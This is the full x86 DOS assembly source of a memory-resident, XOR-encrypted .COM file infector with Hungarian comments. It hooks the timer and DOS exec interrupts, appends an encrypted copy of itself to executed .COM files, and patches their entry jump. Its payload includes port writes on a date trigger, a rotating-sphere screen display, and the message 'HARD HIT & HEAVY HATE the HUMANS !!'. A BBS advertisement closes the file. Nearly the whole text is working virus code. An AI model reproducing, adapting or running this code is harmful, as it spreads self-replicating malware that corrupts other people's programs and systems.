CODE     segment para  public 'code'
         assume  cs:code,ds:code,es:nothing,ss:nothing

                        org     100h

egy                     equ     1               ; one
dma                     equ     0b0h
atvar                   equ     300             ; at paramaeter
xtvar                   equ     1               ; xt parameter
suruseg                 equ     255             ; density
idotartalek             equ     18*30           ; time delay

start:          db      0e9h,0,0
;##################### Initialization ######################
resid:          push    ax
                mov     cx,offset memory - offset begin   ;#### decoding ####
                mov     bx,ds:[101h]
                add     bx,103h+(offset begin-offset resid)
jhg1:           xor     byte ptr [bx],0
                inc     bx
                loop    jhg1

begin:          sub     bx,(offset begin-offset resid)+(offset memory - offset begin)
                mov     cs:[0feh],bx
                mov     ax,[bx+(offset eltarol-offset resid)]
                mov     cl,[bx+(offset eltarol-offset resid)+2]
                mov     ds:[100h],ax
                mov     ds:[102h],cl
                mov     cx,0b800h
                mov     ah,15
                push    bx
                int     10h
                pop     bx
                cmp     al,7
                jne     rety
                mov     ch,0b0h
rety:           mov     [bx+(offset ruut - offset resid)+1],cx
                mov     word ptr [bx+(offset counter-offset resid)],idotartalek
                mov     byte ptr [bx+(offset jammed-offset resid)+1],al
                mov     byte ptr [bx+(offset vanesik-offset resid)],0
                xor     ax,ax
                mov     ds,ax
                cmp     word ptr ds:[130h],4142h
                je      zipp
                mov     ds:[130h],4142h
                mov     ax,cs
                dec     ax
                mov     ds,ax
                mov     ax,ds:[3]
                sub     ax,180h
                mov     ds:[3],ax
                add     ax,ds:[1]
                mov     es,ax
                push    cs
                pop     ds
                sub     word ptr ds:[2],384
                mov     di,3
                mov     si,bx
                mov     cx,(offset memory-offset resid) shr 1 +1
                cld
                rep     movsw
                mov     ax,es
                sub     ax,10h
                mov     ds,ax
                mov     dx,offset irq
                mov     ax,251ch
                int     21h
                mov     ah,2ah
                int     21h
                cmp     al,1
                jne     zipp
                dec     al
                out     0a0h,al
                mov     al,dma
                out     41h,al
zipp:
                mov     ax,cs
                mov     ds,ax
                mov     es,ax
                pop     ax
                push     cs
                mov     cx,100h
                push     cx
                mov     cx,ds:[0feh]
                sub     cx,100h
                retf
eltarol         dw      20cdh
eltarol2        db      90h

;######################### Vyrus activated ##########################
csik:           mov ax,0e000h
                mov ds,ax
csiky:          mov ds:[0],al
                inc al
                jmp csiky

;######################### propagation part ##########################

eredeti:        db 0eah                 ; original
int211          dw 0
int212          dw 0
counter         dw 0
szaporodas:     cmp ah,4bh      
                jne eredeti
                or al,al
                jnz eredeti
                push ax
                push es
                push bx
                push ds
                push dx
                mov bx,dx
koj:            inc bx
                cmp byte ptr [bx],'.'
                jne koj
                cmp byte ptr[bx+1],'C'
                jne kiugras1
                mov cs:kds,ds
                mov cs:kdx,dx
                mov cs:kbx,bx
                call probe
kiugras1:        pop dx
                pop ds
                pop bx
                pop es
                pop ax
                jmp eredeti
kds             dw 0
kdx             dw 0
kbx             dw 0
kkk             dw 0
fszam           dw 0
probe:          push cs
                pop es
                mov di,offset memory
                mov si,dx
                mov cx,40
                cld
                rep movsw
                mov bx,0ff0h
                mov ah,48h
                int 21h
                jnc juk1
                ret
                ;!!!!! memoria lefoglalva   (kkk = Seg)
atr             dw 0
juk1:           mov cs:kkk,ax
                mov dx,offset memory
                push ds
                pop es
                mov bx,cs:kbx
                mov byte ptr [bx+1],'A'  ;œ
                call elorutin
                push cs
                pop ds              ;DS:DX a masolt nev.
                mov ax,4300h
                int 21h
                mov atr,cx
                xor cx,cx
                mov ax,4301h
                int 21h
                                ;!!!!! Attr allitas
                cmp cs:attrflag,0
                jz juk2
                mov ds,cs:kds
                jmp memoff
juk2:           mov di,kdx       ;ES:DI a regi nev atirva
                mov ah,56h
                int 21h
                call utorutin    ;!!!!! Atnevezve
                mov dx,cs:kdx
                push es
                pop ds
                mov ax,3d02h
                int 21h          ;!!!!! File megnyitva
                mov cs:fszam,ax
                mov ds,cs:kkk
                xor dx,dx
                mov bx,ax
                mov cx,0fc00h-(offset memory-offset resid)
                mov ah,3fh
                int 21h
                cmp ax,0fc00h-(offset memory-offset resid)
                        ;!!!!! Beolvasva a program (csak a hossza miatt)
                je hosszu   ;zarjuk le a file-t
                cmp ax,7580
                jb hosszu   ;tul rovid a file
                mov di,ax

                mov bx,ds:[1]
                cmp word ptr [bx+3],0b950h

;$$$$$$$$$$$$$$$$$$$$$$$$$   FUCK OFF TASM,MASM   $$$$$$$$$$$$$$$$$$$$$$$$$$$

                je hosszu
                push di
                mov cx,(offset memory-offset resid)
                mov si,offset resid
                push ds
                pop es
                push cs
                pop ds
                inc byte ptr ds:[offset jhg1 +2]
                mov ax,es:[0]
                mov eltarol,ax
                mov al,es:[2]
                mov eltarol2,al
                rep movsw       ;!!!!! Atmasolva (hehe)
                mov al,byte ptr ds:[offset jhg1 +2]
                pop di
                add di,(offset begin-offset resid)
                mov cx,offset memory - offset begin   ;#### coding ####
jhga:           xor byte ptr es:[di],al
                inc di
                loop jhga
                sub di,(offset memory - offset resid)
                push di         ;Az ugrasi hely
                mov bx,fszam
                mov cx,offset memory - offset begin
                mov dx,di
                push es
                pop ds
                mov ah,40h
                int 21h
                pop di
                cmp ax,offset memory - offset begin
                je ghj1
hosszu:         jmp zardle
ghj1:           ;!!!!! Kiirva a vege
                mov byte ptr ds:[0],0e9h
                sub di,3
                mov ds:[1],di
                mov bx,cs:fszam
                xor cx,cx
                xor dx,dx
                mov ax,4200h
                push bx
                int 21h
                pop bx
                mov cx,3
                xor dx,dx
                mov ah,40h
                int 21h
zardle:         mov bx,cs:fszam
                mov ah,3eh
                int 21h         ;!!!!! File lezarva
                push cs
                pop es
                mov di,offset memory
                mov ds,cs:kds
                mov dx,cs:kdx
                mov ah,56h
                int 21h         ;!!!!! File visszanevezve
                mov bx,cs:kbx
                mov byte ptr ds:[bx+1],'C'
                mov ax,4301h
                mov cx,cs:atr
                int 21h         ;!!!!! attr visszaall
memoff:         mov bx,cs:kbx
                mov byte ptr ds:[bx+1],'C'
                push cs
                pop ds
                mov es,cs:kkk
                mov ah,49h
                int 21h         ;!!!!! Memoria visszaalt
                ret
it241           dw 0
it242           dw 0
attrflag        db 0

elorutin:       mov cs:attrflag,0
                xor ax,ax
                mov ds,ax
                mov ax,ds:[90h]
                mov cs:it241,ax
                mov ax,ds:[92h]
                mov cs:it242,ax
                mov ds:[90h],offset it24
                mov ds:[92h],cs
                ret

utorutin:       xor ax,ax
                mov ds,ax
                mov ax,cs:it241
                mov ds:[90h],ax
                mov ax,cs:it242
                mov ds:[92h],ax
                ret
it24:           mov cs:attrflag,1
                xor al,al
                iret
vanesik         db 0
irq:            cli
                push ds
                push es
                push ax
                push bx
                push cx
                push dx
                push si
                push di
                cmp cs:counter,0
                je sabad
                dec cs:counter
                jne sabad
                xor ax,ax
                mov ds,ax
                mov ax,ds:[84h]
                mov cs:int211,ax
                mov ax,ds:[86h]
                mov cs:int212,ax
                mov ds:[84h],offset szaporodas
                mov ds:[86h],cs
sabad:          cmp cs:vanesik,0
                je keress
                call idovan
                jmp jumper
keress:         call ruut
jumper:         pop di
                pop si
                pop dx
                pop cx
                pop bx
                pop ax
                pop es
                pop ds
                iret

idovan:         xor ah,ah
                int 1ah
                and dx,suruseg
                jne rutyi
                call action
rutyi:          ret


ruut:           mov ax,0b800h
                mov es,ax
                mov di,cs:did
                mov cx,512
                cld
poke:           jcxz huy
                mov al,'E'
                repnz scasb
                jz talalt
huy:            cmp di,4095
                jb kisebb
                mov cs:did,0
                ret
kisebb:         add cs:did,512
                ret
did             dw 0
talalt:         test di,1
                jz poke
                mov dl,es:[di+1]
                mov dh,es:[di+3]
                or dx,2020h
                cmp dx,6973h     ;'is'
                jne poke
                mov bl,es:[di+5]
                or bl,20h
                cmp bl,'k'
                jne poke
                mov cs:vanesik,1
                jmp huy
action:         mov ax,cs
                mov ds,ax
                mov es,ax
                mov vanesik,0
                mov pontszam,1
                mov si,offset zizi
                mov di,offset novi
                cld
                mov cx,6
                rep movsw
                call zoldseg
jammed:         mov ax,3
                int 10h
                cmp counterr,atvar
                jne fdr
                push cs
                pop es
                lea bx,mess
                mov ax,1301h
                mov bx,1
                xor dx,dx
                mov cx,offset drt-offset mess
                int 10h
fdr:            ret

counterr        dw 0
zoldseg:        cli
                mov di,offset memory
                xor ax,ax
                cld
                mov cx,200*3
                rep stosw
                mov ah,0c0h
                mov si,3333h
                int 15h
                cmp si,3333h
                mov ax,xtvar
                je xt
                mov ax,atvar
xt:             mov counterr,ax
                mov ax,3502h
                int 21h
                cmp bx,0e9eh
                jne ibm
                call init1
                mov pontm,100
                mov port,22h
                jmp entry
ibm:            ;Ibm bulik
                mov pontm,200
                mov al,70h
                mov port,60h         ;%
                mov ah,15
                int 10h
                cmp al,7
                jne cga
                call init3
                jmp entry
cga:            call init2
                jmp entry
port            dw 22h
pontm           dw 100

init1:          mov ax,200h
                mov es,ax
                xor di,di
                mov cx,4000h
                cld
                xor ax,ax
                rep stosw
                mov plotdw,offset plot
                mov unplotdw,offset unplot
                ret
init2:          mov ax,0b800h
                mov es,ax
                mov ax,6
                int 10h
                mov plotdw,offset plotcga
                mov unplotdw,offset unplotcga
                ret
init3:          mov ax,0b000h
                mov es,ax
                call prog
                mov plotdw,offset plotherc
                mov unplotdw,offset unplotcga
                ret
prog:           mov dx,3bfh
                mov al,3
                out dx,al
                mov al,28h
                mov dx,3b8h
                out dx,al
                mov ah,0
                mov cx,12
                lea bx,ports
lopi1:          mov dx,03b4h
                mov al,ah
                out dx,al
                inc ah
                mov dx,03b5h
                mov al,[bx]
                out dx,al
                inc bx
                loop lopi1

                mov dx,3bfh
                mov al,3
                out dx,al
                mov dx,3b8h
                mov al,0ah
                out dx,al
                xor di,di
                mov cx,4000h
                xor ax,ax
                cld
                rep stosw
                ret

ports           db 35h,2dh,2eh,7,5bh,2,57h,57h,2,3,0,0

;**************************** Forgatorutin ************************************

                                even
sina    dw 0
cosa    dw 0        ;si-t meghagyja
sinb    dw 0
cosb    dw 0
pontszam dw 1
transzform:     ;be:  di=X, bx=Y, cx=Z,   SINA,COSA,SINB,COSB
;        add bx,ytol     ;ez itt jolesz
                shl di,1
                shl bx,1    ;X es Y elokeszitese a szorzashoz
                mov ax,di
                imul cosa
                mov bp,dx
                mov ax,bx
                imul sina
                add bp,dx   ; bp=X'     = cosa*X + sina*Y
                mov ax,bx
                imul cosa
                mov bx,dx
                mov ax,di
                imul sina
                sub bx,dx   ; bx=Y'     = cosa*X - sina*Y
                shl bp,1
                shl cx,1    ;X' es Z elokeszitese
                mov ax,bp
                imul cosb
                mov di,dx
                mov ax,cx
                imul sinb
                sub di,dx   ; di=X''    = cosb*X' - sinb*Z
                mov cx,di
                mov ax,bx
                ret

comment @
                mov ax,cx
                imul cosb
                mov cx,dx
                mov ax,bp
                imul sinb
                add cx,dx   ; cx=Z''    = cosb*Z = sinb*X'

                        ; out: di=X'' bx=Y'' cx=Z''
                mov dx,keptav
;****************************** PERSPEKTIVA **********************************
         mov ax,di
         shl ax,1
         imul tavol
         mov cx,dx
         mov ax,bx
         shl ax,1
         imul tavol
         mov ax,dx
         ret     ; ki : CX=X'  AX=Y'

@

plotherc:   ; al=y     cx=x
                xor ah,ah
                mov dx,ax
                shr dx,1
                add ax,dx
                mov dx,cx
                mov cl,al
                and cl,3
                shr ax,1
                shr al,1
                mov di,2000h
                shl di,cl
                mov cl,90
                mul cl
                add di,ax
                mov ax,dx
                mov cx,dx
                jmp ezisi
plotcga:        xor di,di
                shr ax,1
                jnc tryp
                mov di,2000h
tryp:           mov dl,80
                mul dl
                add di,ax
                mov ax,cx
ezisi:          shr ax,1
                shr ax,1
                shr ax,1
                add di,ax
                and cl,7
                mov al,128
                shr al,cl
                or es:[di],al
                jmp ezis1

unplotcga:      mov al,[bx]
                mov di,[bx+1]
                xor al,255
                and es:[di],al
                ret

plot:                   ;AL = y koord.  cx = x koord.
                mov dl,160
                mul dl
                mov di,ax
                mov ax,cx
                shr ax,1
                shr ax,1
                add di,ax
                and di,-2
                and cl,7
                mov al,128
                shr al,cl
                or es:[di+egy],al
ezis1:          mov [bx],al
                inc bx
                mov [bx],di
                add bx,2
                ret
unplot:         mov al,[bx]
                mov di,[bx+1]
                xor al,255
                and es:[di+egy],al
                ret
kezdfazisrajz:  mov bx,offset memory
                mov si,offset gombdata
                mov cx,pontszam
ck1:            push cx
                lodsw
                mov cx,ax
                shl cx,1
                add cx,320
                lodsw
                add si,2
                add ax,50
                call word ptr [plotdw]
                pop cx
                loop ck1
                ret
indy            db 0

fazisrajz:      mov bx,offset memory
                mov si,offset gombdata
                mov cx,pontszam
                mov indy,1
ck12:           push cx
                call word ptr [unplotdw]
                push bx
                lodsw
                mov di,ax
                lodsw
                mov bx,ax
                lodsw
                mov cx,ax
                call transzform
                pop bx
                add ax,50
                mov di,bxpo
                add al,[di]
                shl cx,1
                add cx,bxpo2
                cmp indy,0
                je ruty
                mov indy,0
                cmp karal2,0
                jne ruty
                push cx
                push ax
                inc cx
                call word ptr [plotdw]
                pop ax
                pop cx
                sub bx,3
ruty:           call word ptr [plotdw]
                pop cx
                loop ck12
                ret

novpont:        mov ax,pontm
                cmp pontszam,ax
                je trew
                mov cx,pontm
                sub cx,pontszam
                mov ch,cl
                shR cx,1
                shr cx,1
yut:            loop yut
                inc pontszam
                ret
trew:           call movie
                mov bx,bxpo
                cmp bx,offset patt
                je valto
                cmp bx,offset patt+29
                je valto
iuy:            add bx,novi
                mov bxpo,bx
                ret
valto:          neg novi
                jmp iuy
novi            dw -1
bxpo            dw offset patt
bxpo2           dw 320
novi2           dw 4
karal           dw 300
karal2          dw 600
zizi            dw -1,offset patt,320,4,300,600
movie:          cmp karal,0
                je jesty
                dec karal
                ret
jesty:          cmp karal2,0
                je jesty2
                dec karal2
jesty2:         mov bx,bxpo2
                cmp bx,100
                je valto2
                cmp bx,540
                je valto2
iuy2:           add bx,novi2
                mov bxpo2,bx
                ret
valto2:         neg novi2
                jmp iuy2
elokesz:        call novpont
                mov bl,szogx
                xor bh,bh
                shl bx,1
                mov ax,sintabl[bx]
                mov sina,ax
                mov ax,costabl[bx]
                mov cosa,ax
                mov bl,szogy
                xor bh,bh
                shl bx,1
                mov ax,sintabl[bx]
                mov sinb,ax
                mov ax,costabl[bx]
                mov cosb,ax
                mov al,szogxvalt
                add szogx,al
                mov al,szogyvalt
                add szogy,al
                ret
        even
szogx           db 0
szogy           db 0
szogxvalt       db 2
szogyvalt       db 5
tavol           dw 32767

phase:          call elokesz
                call fazisrajz
                ret
entry:          call kezdfazisrajz
rajta1:         call phase
                cmp pontm,100
                je apc
                cmp byte ptr ds:[offset ruut +2],0b8h
                je ccggaa
                mov cx,counterr
                mov dx,3bah
qaz1:           in al,dx
                and al,1
                jnz qaz1
qaz2:           in al,dx
                and al,1
                jz qaz2
                loop qaz1
                jmp apc
ccggaa:         mov dx,3dah
qaz3:           in al,dx
                and al,8
                jnz qaz3
qaz4:           in al,dx
                and al,8
                jz qaz4
apc:            mov dx,port
                in al,dx
                and al,1
                jz rajta1
                ret
        even
plotdw          dw 0
unplotdw        dw 0

sintabl         dw      0,      804,   1608,  2410,  3212,  4011,  4808,  5602,  6393
                dw      7179,   7962,  8739,  9512, 10278, 11039, 11793, 12539, 13279
                dw      14010, 14732, 15446, 16151, 16846, 17530, 18204, 18868, 19519
                dw      20159, 20787, 21403, 22005, 22594, 23170, 23731, 24279, 24811
                dw      25329, 25832, 26319, 26790, 27245, 27683, 28105, 28510, 28898
                dw      29268, 29621, 29956, 30273, 30571, 30852, 31113, 31356, 31580
                dw      31785, 31971, 32137, 32285, 32412, 32521, 32609, 32678, 32728
                dw      32757, 32767, 32757, 32728, 32678, 32609, 32521, 32412, 32285
                dw      32137, 31971, 31785, 31580, 31356, 31113, 30852, 30571, 30273
                dw      29956, 29621, 29268, 28898, 28510, 28105, 27683, 27245, 26790
                dw      26319, 25832, 25329, 24811, 24279, 23731, 23170, 22594, 22005
                dw      21403, 20787, 20159, 19519, 18868, 18204, 17530, 16846, 16151
                dw      15446, 14732, 14010, 13279, 12539, 11793, 11039, 10278,  9512
                dw      8739,   7962,  7179,  6393,  5602,  4808,  4011,  3212,  2410
                dw      1608,    804,     0,  -804, -1608, -2410, -3212, -4011, -4808
                dw      -5602, -6393, -7179, -7962, -8739, -9512,-10278,-11039,-11793
                dw      -12539,-13279,-14010,-14732,-15446,-16151,-16846,-17530,-18204
                dw      -18868,-19519,-20159,-20787,-21403,-22005,-22594,-23170,-23731
                dw      -24279,-24811,-25329,-25832,-26319,-26790,-27245,-27683,-28105
                dw      -28510,-28898,-29268,-29621,-29956,-30273,-30571,-30852,-31113
                dw      -31356,-31580,-31785,-31971,-32137,-32285,-32412,-32521,-32609
                dw      -32678,-32728,-32757,-32767,-32757,-32728,-32678,-32609,-32521
                dw      -32412,-32285,-32137,-31971,-31785,-31580,-31356,-31113,-30852
                dw      -30571,-30273,-29956,-29621,-29268,-28898,-28510,-28105,-27683
                dw      -27245,-26790,-26319,-25832,-25329,-24811,-24279,-23731,-23170
                dw      -22594,-22005,-21403,-20787,-20159,-19519,-18868,-18204,-17530
                dw      -16846,-16151,-15446,-14732,-14010,-13279,-12539,-11793,-11039
                dw      -10278, -9512, -8739, -7962, -7179, -6393, -5602, -4808, -4011
                dw      -3212,  -2410, -1608,  -804
costabl         dw      32767,  32757, 32728, 32678, 32609, 32521, 32412, 32285
                dw      32137,  31971, 31785, 31580, 31356, 31113, 30852, 30571
                dw      30273,  29956, 29621, 29268, 28898, 28510, 28105, 27683
                dw      27245,  26790, 26319, 25832, 25329, 24811, 24279, 23731
                dw      23170,  22594, 22005, 21403, 20787, 20159, 19519, 18868
                dw      18204,  17530, 16846, 16151, 15446, 14732, 14010, 13279
                dw      12539,  11793, 11039, 10278,  9512,  8739,  7962,  7179
                dw       6393,   5602,  4808,  4011,  3212,  2410,  1608,   804
                dw          0,   -804, -1608, -2410, -3212, -4011, -4808, -5602
                dw      -6393,  -7179, -7962, -8739, -9512,-10278,-11039,-11793
                dw     -12539, -13279,-14010,-14732,-15446,-16151,-16846,-17530
                dw     -18204, -18868,-19519,-20159,-20787,-21403,-22005,-22594
                dw     -23170, -23731,-24279,-24811,-25329,-25832,-26319,-26790
                dw     -27245, -27683,-28105,-28510,-28898,-29268,-29621,-29956
                dw     -30273, -30571,-30852,-31113,-31356,-31580,-31785,-31971
                dw     -32137, -32285,-32412,-32521,-32609,-32678,-32728,-32757
                dw     -32767, -32757,-32728,-32678,-32609,-32521,-32412,-32285
                dw     -32137, -31971,-31785,-31580,-31356,-31113,-30852,-30571
                dw     -30273, -29956,-29621,-29268,-28898,-28510,-28105,-27683
                dw     -27245, -26790,-26319,-25832,-25329,-24811,-24279,-23731
                dw     -23170, -22594,-22005,-21403,-20787,-20159,-19519,-18868
                dw     -18204, -17530,-16846,-16151,-15446,-14732,-14010,-13279
                dw     -12539, -11793,-11039,-10278, -9512, -8739, -7962, -7179
                dw      -6393,  -5602, -4808, -4011, -3212, -2410, -1608,  -804
                dw          0,    804,  1608,  2410,  3212,  4011,  4808,  5602
                dw       6393,   7179,  7962,  8739,  9512, 10278, 11039, 11793
                dw      12539,  13279, 14010, 14732, 15446, 16151, 16846, 17530
                dw      18204,  18868, 19519, 20159, 20787, 21403, 22005, 22594
                dw      23170,  23731, 24279, 24811, 25329, 25832, 26319, 26790
                dw      27245,  27683, 28105, 28510, 28898, 29268, 29621, 29956
                dw      30273,  30571, 30852, 31113, 31356, 31580, 31785, 31971
                dw      32137,  32285, 32412, 32521, 32609, 32678, 32728, 32757
gombdata:
                DW       44,  3, 22, 29,  6, 40,  7,  9, 48,-14, 12, 46
                DW      -33, 15, 33,-44, 18, 14,-44, 21, -7,-35, 24,-25
                DW      -19, 26,-37,  0, 29,-40, 17, 31,-34, 29, 34,-21
                DW       33, 36, -5, 30, 38,  9, 20, 40, 20,  8, 42, 25
                DW       -3, 43, 23,-12, 45, 17,-16, 46,  8,-15, 47,  0
                DW      -11, 48, -5, -5, 49, -7,  0, 49, -6,  0, 49, -2
                DW        0, 49,  0, -2, 49,  0, -6, 49,  0, -7, 49, -5
                DW       -5, 48,-11,  0, 47,-15,  8, 46,-16, 17, 45,-12
                DW       23, 43, -3, 25, 42,  8, 20, 40, 20,  9, 38, 30
                DW       -5, 36, 33,-21, 34, 29,-34, 31, 17,-40, 29,  0
                DW      -37,26,-19,-25,24,-35,-7,21,-44,14,18,-44
                DW      33,15,-33,46,12,-14,48,9,7,40,6,29
                DW      22,3,44,0,0,49,-22,-3,44,-40,-6,29
                DW      -48,-9,7,-46,-12,-14,-33,-15,-33,-14,-18,-44
                DW      7,-21,-44,25,-24,-35,37,-26,-19,40,-29,0
                DW      34,-31,17,21,-34,29,5,-36,33,-9,-38,30
                DW      -20,-40,20,-25,-42,8,-23,-43,-3,-17,-45,-12
                DW      -8,-46,-16,0,-47,-15,5,-48,-11,7,-49,-5
                DW      6,-49,0,2,-49,0,0,-49,0,0,-49,-2
                DW      0,-49,-6,5,-49,-7,11,-48,-5,15,-47,0
                DW      16,-46,8,12,-45,17,3,-43,23,-8,-42,25
                DW      -20,-40,20,-30,-38,9,-33,-36,-5,-29,-34,-21
                DW      -17,-31,-34,0,-29,-40,19,-26,-37,35,-24,-25
                DW      44,-21,-7,44,-18,14,33,-15,33,14,-12,46
                DW      -7,-9,48,-29,-6,40,-44,-3,22,-49,0,0
                DW      -44,3,-22,-29,6,-40,-7,9,-48,14,12,-46
                DW      33,15,-33,44,18,-14,44,21,7,35,24,25
                DW      19,26,37,0,29,40,-17,31,34,-29,34,21
                DW      -33,36,5,-30,38,-9,-20,40,-20,-8,42,-25
                DW      3,43,-23,12,45,-17,16,46,-8,15,47,0
                DW      11,48,5,5,49,7,0,49,6,0,49,2
                DW      0,49,0,2,49,0,6,49,0,7,49,5
                DW      5,48,11,0,47,15,-8,46,16,-17,45,12
                DW      -23,43,3,-25,42,-8,-20,40,-20,-9,38,-30
                DW      5,36,-33,21,34,-29,34,31,-17,40,29,0
                DW      37,26,19,25,24,35,7,21,44,-14,18,44
                DW      -33,15,33,-46,12,14,-48,9,-7,-40,6,-29
                DW      -22,3,-44,0,0,-49,22,-3,-44,40,-6,-29
                DW      48,-9,-7,46,-12,14,33,-15,33,14,-18,44
                DW      -7,-21,44,-25,-24,35,-37,-26,19,-40,-29,0
                DW      -34,-31,-17,-21,-34,-29,-5,-36,-33,9,-38,-30
                DW      20,-40,-20,25,-42,-8,23,-43,3,17,-45,12
                DW      8,-46,16,0,-47,15,-5,-48,11,-7,-49,5
                DW      -6,-49,0,-2,-49,0,0,-49,0,0,-49,2
                DW      0,-49,6,-5,-49,7,-11,-48,5,-15,-47,0
                DW      -16,-46,-8,-12,-45,-17,-3,-43,-23,8,-42,-25
                DW      20,-40,-20,30,-38,-9,33,-36,5,29,-34,21
                DW      17,-31,34,0,-29,40,-19,-26,37,-35,-24,25
                DW      -44,-21,7,-44,-18,-14,-33,-15,-33,-14,-12,-46
                DW      7,-9,-48,29,-6,-40,44,-3,-22,49,0,0
patt:           DB       0, 0, 0, 0, 0, 1, 1, 2, 4, 5, 7, 9,11,14,17,20,23,27
                db      31,35,40,45,50,56,61,67,73,80,86,93



mess            db      'HARD HIT & HEAVY HATE the HUMANS !!'
                db      '           [ H.H.& H.H. the H. ]   '
drt             dw      5 dup (0)
memory:
                CODE     ENDS

                END     START

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

